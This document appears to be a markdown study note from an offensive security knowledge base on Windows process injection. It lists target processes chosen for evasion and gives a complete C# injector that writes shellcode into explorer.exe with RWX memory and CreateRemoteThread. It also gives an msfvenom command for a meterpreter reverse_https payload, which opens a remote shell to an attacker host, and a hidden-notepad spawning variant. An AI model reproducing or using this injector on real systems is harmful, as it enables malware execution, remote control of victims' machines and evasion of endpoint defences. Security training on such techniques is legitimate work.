---
tags:
  - Code_Injection
  - Defense_Evasion
  - Foundational
  - Windows
---

## Process Injection Theory
resources: [MITRE ATT&CK - Process Injection](https://attack.mitre.org/techniques/T1055/)

> [!info] Inject code into another process's memory space. Evades process-based detection and inherits target's privileges/context.

### Why Process Injection?
> [!tip] Benefits of process injection:
> - **Evasion** - Code runs in legitimate process
> - **Privilege** - Inherit target process permissions
> - **Persistence** - Survive original process termination
> - **Context** - Access target's tokens and resources

### Common Injection Targets
> [!tip] Good target processes:
> - **explorer.exe** - Always running, user context
> - **svchost.exe** - Multiple instances, various privileges
> - **notepad.exe** - Benign appearance, spawnable
> - **RuntimeBroker.exe** - Common Windows 10 process

### Required APIs
> - **OpenProcess** - Get handle to target process
> - **VirtualAllocEx** - Allocate memory in remote process
> - **WriteProcessMemory** - Write shellcode to allocated memory
> - **CreateRemoteThread** - Execute shellcode in remote process

## Process Injection in C#

### API Imports
```csharp
using System;
using System.Runtime.InteropServices;
using System.Diagnostics;

public class Injector
{
    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll")]
    static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

    [DllImport("kernel32.dll")]
    static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    // Process access rights
    const uint PROCESS_ALL_ACCESS = 0x001F0FFF;
}
```

### Complete C# Process Injector
```csharp
using System;
using System.Runtime.InteropServices;
using System.Diagnostics;

public class Injector
{
    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll")]
    static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

    [DllImport("kernel32.dll")]
    static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    static void Main(string[] args)
    {
        // msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<IP> LPORT=<Port> -f csharp
        byte[] buf = new byte[<Size>] { 0xfc, 0x48, 0x83, ... };

        // Find target process
        Process[] procs = Process.GetProcessesByName("explorer");
        int pid = procs[0].Id;

        // Open process with full access
        IntPtr hProcess = OpenProcess(0x001F0FFF, false, pid);

        // Allocate RWX memory in remote process
        IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)buf.Length, 0x3000, 0x40);

        // Write shellcode to allocated memory
        IntPtr outSize;
        WriteProcessMemory(hProcess, addr, buf, buf.Length, out outSize);

        // Execute shellcode via remote thread
        IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
    }
}
```

### Find Process by Name [alternative]
```csharp
public static int GetProcessId(string processName)
{
    Process[] processes = Process.GetProcessesByName(processName);
    if (processes.Length > 0)
    {
        return processes[0].Id;
    }
    return -1;
}
```

### Spawn and Inject [alternative]
> [!tip] Spawn new process in suspended state, inject, then resume.

```csharp
Process proc = new Process();
proc.StartInfo.FileName = @"C:\Windows\System32\notepad.exe";
proc.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
proc.Start();

// Give process time to initialize
System.Threading.Thread.Sleep(1000);

int pid = proc.Id;
// ... injection code ...
```
